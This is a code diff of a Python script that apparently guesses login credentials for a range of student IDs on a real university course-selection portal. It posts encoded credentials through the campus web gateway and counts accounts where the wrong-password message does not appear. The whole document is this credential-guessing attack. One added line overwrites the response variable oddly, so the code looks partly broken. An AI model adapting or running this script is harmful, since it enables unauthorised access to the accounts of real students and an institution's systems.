@@ -1,9 +1,9 @@
 import base64, requests, re
 import OutNetLink
 
-fo = open("list.txt", "wb+")
+fo = open("getlist_by_outweb.txt", "wb+")
 cnt = 0
-for i in range(2015201101, 2015202131):
+for i in range(2015201101, 2015202135):
     s = OutNetLink.getConn()
     url = 'https://ssl.hrbeu.edu.cn/web/1/http/1/edus' \
           'ys.hrbeu.edu.cn/jsxsd/xk/LoginToXk'
@@ -16,10 +16,16 @@ for i in range(2015201101, 2015202131):
         'encoded': arg
     }
     cur = s.post(url=url, data=data)
-    print(cur.text)
+    # print(cur.text)
     fi = re.search(u'用户名或密码错误', cur.text)
     # print(fi)
     if fi is None:
         cnt = cnt + 1
+        cur = zh + ' '
+        # fo.write(zh)
+        # fo.write('  ')
+        # fo.write(psw)
+        # fo.write('\n')
 
+fo.close()
 print(cnt)
